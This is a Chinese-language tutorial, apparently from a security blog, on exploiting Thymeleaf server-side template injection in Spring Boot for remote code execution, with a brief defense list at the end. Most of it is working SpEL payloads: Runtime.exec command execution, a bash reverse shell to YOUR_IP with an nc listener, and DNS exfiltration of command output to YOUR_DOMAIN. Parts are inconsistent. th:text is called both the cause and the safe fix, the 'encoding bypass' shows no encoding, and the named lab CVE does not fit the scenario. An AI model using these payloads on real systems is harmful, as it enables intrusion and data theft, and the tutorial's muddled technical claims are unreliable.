Thymeleaf SSTI → RCE：Spring Boot模板注入实战

概述

服务端模板注入（SSTI）是一种当用户输入被直接嵌入模板引擎解析时产生的漏洞。在Spring Boot + Thymeleaf环境下，如果开发者错误地使用th:text或直接拼接模板路径，可能导致远程代码执行。

🐱 猫猫提示：SSTI就像把钥匙交给陌生人，让他自己开门进屋~

环境搭建

使用Vulhub的Spring Boot靶场环境：

# 克隆靶场
git clone https://github.com/vulhub/vulhub.git
cd vulhub/spring/CVE-2022-22963

# 启动环境
docker-compose up -d

漏洞发现

访问目标站点，发现URL参数可控：

http://target:8080/?name=cat

测试模板表达式注入：

http://target:8080/?name=${7*7}
# 返回 49，确认存在SSTI

判断模板引擎

通过不同payload判断模板引擎类型：

# Thymeleaf 特征
${7*7}     → 49
__${7*7}__ → 49 (行内表达式)

# 如果返回原样，可能是其他引擎
#{7*7}     → 原样输出 (不是Freemarker)

Payload构造

Thymeleaf使用SpEL（Spring Expression Language），可以执行任意Java代码：

基本SpEL

# 获取系统属性
${T(java.lang.System).getProperty('os.name')}

# 执行命令
${T(java.lang.Runtime).getRuntime().exec('id')}

URL编码绕过

# 如果有WAF，需要编码
${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id'})}

RCE利用

完整利用链：

# 1. 确认RCE
/?name=${T(java.lang.Runtime).getRuntime().exec('id')}

# 2. 反弹Shell
/?name=${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'})}

# 3. 监听
nc -lvnp 4444

无回显情况

如果命令执行结果不回显，可以使用DNS外带数据：

# DNS外带
/?name=${T(java.lang.Runtime).getRuntime().exec(new String[]{'bash','-c','id | nslookup YOUR_DOMAIN'})}

防御方案

  • 升级Spring Boot到最新版本
  • 不要将用户输入直接嵌入模板
  • 使用th:text等安全的Thymeleaf语法
  • 配置WAF拦截SpEL特征
